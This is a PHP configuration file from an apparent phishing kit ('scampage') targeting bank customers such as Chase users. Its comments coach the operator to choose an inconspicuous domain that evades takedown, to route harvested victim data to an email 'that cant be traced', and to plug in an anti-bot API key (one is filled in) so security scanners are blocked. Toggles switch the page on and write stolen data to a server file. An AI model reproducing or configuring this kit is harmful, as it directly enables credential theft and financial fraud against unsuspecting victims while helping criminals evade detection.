<?php
   /*

        CREDIT: @RETRO_CODER

   */


// CHANGE THE DATA'S INSIDE THIS TWO VARIABLES. 
// *******************************************************
// IN THE "$YOUR_DOMAIN_NAME" VARIABLE; PUT THE DOMAIN NAME YOU WILL BE USING TO HOST THIS SCAMPAGE, SAY FOR EXAMPLE => "chas12egh.co". DO NOT ADD THE "WWW" OR "HTTP" 
// OR "HTTPS" PREFIX, USE THIS FORMATE => "your_scampage_domain_name.com". WARNING: SAY FOR EXAMPLE YOU HAVE A CHASE SCAMPAGE, THE MORE YOUR DOMAIN NAME DOESN'T HAVE CHASE-LIKE 
// LETTERS IN IT THE LONGER YOUR SCAMPAGE WOULD AVOID BEING CAUGHT AND ALSO THE BETTER THE DELIVERABILITY OF MAILS FROM YOUR SCAMEPAGE TO YOUR WORKING MAIL.
// 
// IN THE "$WORKING_MAIL" VARIABLE; ADD THE EMAIL TO WHICH YOU WANT THE SPAMMED DATA TO BE SENT TO. MAKE SURE TO USE A WORKING EMAIL THAT CANT BE TRACED TO YOU DIRECTLY.
// ALSO MAKE SURE NOT TO ADD THE "WWW" OR "HTTP" OR "HTTPS" PREFIX, USE THIS FORMATE => "your_working_email@yandex.com".
###########################################################################################################
$YOUR_DOMAIN_NAME = "your_scampage_domain_name.com"; // [CHANGE THIS] => PUT YOUR WEBSITE DOMAIN NAME HERE, use this format, please dont add www or http or http 
###########################################################################################################

###########################################################################################################
$WORKING_MAIL = "your_working_email@yandex.com"; // [CHANGE THIS] => PUT YOUR EMAIL HERE #AnTiBoTs7
###########################################################################################################

/* ENTER YOUR KILL-BOT API KEY IF YOU HAVE ONE. (https://killbot.org/developers) */
$KILLBOT_API = '5UnkIVr0n9O2mddmObEOdexG-Bzw0oCR6wYleFgLwvHVW';








/* TOGGLE THIS TO "FALSE", TO DEACTIVATE THE OPERATIONS OF THIS SCAMEPAGE, SO EVEN WHEN THIS SCAMPAGE IS HOSTED, IT DOESN'T WORK. */
$ENGINE_START = TRUE;
/* TOGGLE THIS TO "FALSE", TO DEACTIVATE THE FUNCTION OF WRITTING DATA TO SERVER'S "DATA.TXT" FILE.  */
$WRITE_TO_DISK_CONTROLLER = TRUE;

function now() {
    date_default_timezone_set('GMT');
    return date("d/m/Y H:i:s");
}

?>
